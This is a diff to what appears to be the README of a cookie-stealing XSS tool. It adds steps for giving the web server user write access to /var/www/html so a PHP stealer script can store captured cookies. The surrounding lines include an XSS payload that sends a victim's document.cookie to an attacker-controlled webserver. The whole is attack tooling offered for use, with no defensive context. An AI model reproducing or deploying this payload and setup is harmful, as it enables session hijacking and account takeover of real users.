@@ -34,6 +34,22 @@ sudo mv cookiestealer-simple.php /var/www/html/
 
 Example: http://[Attacker Webserver]/cookiesteal-simple.php
 
+**_Setting Permissions**_:
+
+Figure out which user is owning httpd process using the following command
+
+ps aux | grep httpd
+
+Output should be similar to this:
+
+ec2-user  1569  0.0  0.1  12840  1064 pts/0    S+   17:55   0:00 grep httpd
+
+So now you know the user who is trying to write files, which is in this case ec2-user You can now go ahead and set the permission for directory where your php script is trying to write something:
+
+sudo chown ec2-user:ec2-user /var/www/html/
+
+sudo chmod 755 /var/www/html/
+
 _XSS Payload Examples_:
 * <script javascript:text>document.location="http://[Attacker Webserver]cookiesteal-simple.php?c=" + document.cookie + "&t=Alert"; </script>
 
